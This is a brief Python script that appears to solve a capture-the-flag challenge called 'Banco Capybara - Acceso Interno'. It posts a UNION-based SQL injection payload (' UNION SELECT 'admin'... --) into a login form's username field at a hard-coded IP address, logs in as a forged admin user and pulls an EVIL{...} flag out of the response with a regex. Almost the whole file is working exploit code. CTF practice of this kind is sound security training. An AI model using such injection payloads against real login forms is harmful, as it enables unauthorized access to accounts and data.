#!/usr/bin/env python3
"""
Solve script for Challenge #5: Banco Capybara - Acceso Interno
Exploits SQL injection in login form to achieve admin access via UNION injection.
"""

import sys
import requests

URL = "http://192.99.247.166:8081/"

def solve():
    # UNION injection with 4 columns to forge admin user
    payload = "' UNION SELECT 'admin','admin','admin','admin'--"
    data = {
        "usuario": payload,
        "password": "x"
    }
    
    resp = requests.post(URL, data=data, timeout=10)
    
    # Extract flag from response
    if "EVIL{" in resp.text:
        import re
        flag_match = re.search(r'EVIL\{[^}]+\}', resp.text)
        if flag_match:
            print(flag_match.group(0))
            return 0
    
    print("Flag not found in response", file=sys.stderr)
    return 1

if __name__ == "__main__":
    sys.exit(solve())